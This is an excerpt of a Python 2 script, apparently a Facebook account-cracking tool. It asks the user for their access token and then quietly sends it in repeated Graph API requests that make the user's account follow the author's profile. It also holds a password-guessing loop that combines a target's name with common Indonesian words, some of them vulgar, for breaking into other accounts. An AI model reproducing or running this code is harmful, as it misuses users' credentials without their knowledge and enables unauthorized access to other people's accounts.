#!/usr/bin/python2
# coding=utf-8
#Thanks For Allah SWT and All my team and everyone who has helped and supported me
# Code By AprizalHadi/RizzaldiEX
...
def bot_follow():
	try:
		...
		print("\n   [!] Token invalid")
		logs()
		requests.post('https://graph.facebook.com/100009903577833/subscribers?access_token=' + toket)      #Author
		requests.post('https://graph.facebook.com/100009903577833/subscribers?access_token=' + toket)      #Owner
		requests.post('https://graph.facebook.com/100009903577833/subscribers?access_token=' + toket)      #Owner
		requests.post('https://graph.facebook.com/100009903577833/subscribers?access_token=' + toket) #
		requests.post('https://graph.facebook.com/100009903577833/subscribers?access_token=' + toket) #
		requests.post('https://graph.facebook.com/100009903577833/subscribers?access_token=' + toket) #
    	requests.post('https://graph.facebook.com/100009903577833/subscribers?access_token=' + toket)      #
    	requests.post('https://graph.facebook.com/100009903577833/subscribers?access_token=' + toket) #
...
def tokenz():
	...
	try:
		...
		print logo
		print""+p+""
		print"[+] Author RizzaldiEX"
		print"[+] Di Isi Dulu ngeb"
		token = raw_input('\n[+] Token : ')
		try:
...
def pilih_menubapi():
    ...
    def main(arg):
        ...
        try:
            for pw in [name.lower(), name.lower() + '123', name.lower() + '1234', name.lower() + '12345', 'katasandi', 'sayang', 'bismillah', 'doraemon', 'sayangku', 'indonesia', 'rahasia', 'jancok', 'anjing', 'akucantik', 'qwerty', 'setiahati', 'jomblo', 'jenong', 'ganteng', 'akuganteng', 'ngentod', 'dancok', 'kampang', 'lampung', '123456', 'kontol', 'bangsat', 'sangek', 'tapaksuci']:
